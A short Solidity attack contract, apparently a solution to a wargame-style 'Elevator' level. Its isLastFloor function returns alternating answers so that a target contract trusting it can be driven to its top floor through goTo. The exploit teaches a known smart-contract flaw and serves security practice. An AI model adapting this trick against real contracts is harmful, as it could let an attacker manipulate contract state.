pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Scaffold {
    Elevator elevator;
    bool isTop;

    constructor(address _elevatorAddr) {
        elevator = Elevator(_elevatorAddr);
    }

    function attack() external {
        elevator.goTo(0);
    }

    function isLastFloor(uint256) external returns (bool result) {
        result = isTop;
        if (isTop == true) {
            isTop = false;
        } else if (isTop == false) {
            isTop = true;
        }
    }
}
